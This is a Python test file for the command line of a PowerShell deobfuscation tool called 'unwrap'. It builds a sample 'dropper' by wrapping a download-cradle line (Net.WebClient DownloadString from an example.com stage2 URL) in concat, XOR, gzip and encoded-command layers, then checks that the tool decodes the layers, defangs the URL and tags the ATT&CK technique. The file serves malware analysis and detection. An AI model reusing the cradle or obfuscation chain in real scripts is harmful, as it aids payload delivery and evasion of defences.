"""The command line, end to end."""

import contextlib
import io
import json
import os
import random
import tempfile
import unittest
from pathlib import Path
from unittest import mock

import obfuscator as ob
from unwrap import __version__
from unwrap.cli import main

PAYLOAD = "(New-Object Net.WebClient)." + "Download" + "String('http://example.com/stage2.txt') | Out-Null"


def sample() -> str:
    rng = random.Random(7)
    code = PAYLOAD
    for technique in (ob.ps_concat, ob.ps_xor, ob.ps_gzip, ob.ps_encoded):
        code = technique(rng, code)
    return code


def run(*argv, stdin=None):
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        if stdin is not None:
            fake = mock.Mock()
            fake.buffer.read.return_value = stdin
            with mock.patch("sys.stdin", fake):
                code = main(list(argv))
        else:
            code = main(list(argv))
    return code, out.getvalue(), err.getvalue()


class Cli(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.path = Path(self.tmp.name, "dropper.bat")
        self.path.write_text(sample(), encoding="utf-8")

    def test_report(self):
        code, out, _ = run(str(self.path), "--no-color")
        self.assertEqual(code, 0)
        self.assertIn(f"unwrap v{__version__}", out)
        self.assertIn("FINAL", out)
        self.assertIn(PAYLOAD, out)
        self.assertIn("decoded: encoded-command", out)
        self.assertIn("hxxp://example[.]com/stage2.txt", out)          # defanged by default
        self.assertIn("T1105", out)

    def test_no_defang(self):
        _, out, _ = run(str(self.path), "--no-color", "--no-defang")
        self.assertIn("http://example.com/stage2.txt", out)

    def test_json(self):
        code, out, _ = run(str(self.path), "--json")
        data = json.loads(out)
        self.assertEqual(code, 0)
        self.assertEqual(data["final"], PAYLOAD)
        techniques = [layer["decoded_by"]["technique"] for layer in data["layers"] if layer["decoded_by"]]
        self.assertEqual(techniques[0], "encoded-command")
        self.assertIn(techniques[1], ("gzip-base64", "deflate-base64"))
        self.assertEqual(techniques[2:], ["xor", "invoke-expression"])
        self.assertEqual(data["indicators"]["urls"], ["hxxp://example[.]com/stage2.txt"])
        self.assertIn("T1105", [b["technique"] for b in data["behaviours"]])

    def test_command_and_stdin(self):
        _, out, _ = run("-c", "iex ('Write-'+'Output 1')", "--json")
        self.assertEqual(json.loads(out)["final"], "Write-Output 1")
        _, out, _ = run("-", "--json", stdin="iex ('Write-'+'Output 2')".encode("utf-16"))
        self.assertEqual(json.loads(out)["final"], "Write-Output 2")

    def test_layers_dir(self):
        target = Path(self.tmp.name, "layers")
        run(str(self.path), "--layers-dir", str(target), "--no-color")
        files = sorted(os.listdir(target))
        self.assertEqual(files[0], "layer-00.txt")
        self.assertEqual(Path(target, files[-1]).read_text(encoding="utf-8"), PAYLOAD)

    def test_max_layers(self):
        _, out, _ = run(str(self.path), "--json", "--max-layers", "2")
        data = json.loads(out)
        self.assertEqual(len(data["layers"]), 2)
        self.assertEqual(data["stopped"], "layer limit (2) reached")

    def test_missing_file(self):
        code, _, err = run(str(Path(self.tmp.name, "nope.ps1")))
        self.assertEqual(code, 2)
        self.assertIn("unwrap:", err)

    def test_ascii_console(self):
        from unwrap import cli
        stream = mock.Mock(encoding="cp437")
        self.assertEqual(cli._glyphs(stream)["arrow"], "->")


if __name__ == "__main__":
    unittest.main()
